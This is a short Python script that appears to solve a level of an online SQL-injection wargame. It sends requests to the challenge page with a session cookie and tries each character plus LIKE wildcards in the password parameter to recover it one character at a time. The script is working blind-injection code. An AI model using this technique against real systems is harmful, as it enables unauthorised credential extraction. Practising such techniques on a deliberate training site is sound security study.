import requests
url='https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
cookies={"PHPSESSID":"9g8clqv102h2sohm6v1ef5i0es"}
b="_"
c="0123456789abcdefghijklmnopqrstuvwxyz"
for i in c:
 params={"pw":""+i+"_______"}
 r=requests.get(url,params=params,cookies=cookies)
 a=r.url
 print(f"hacker {i} accept {r.text.split('<br>')[1].split('<code>')[0]}")
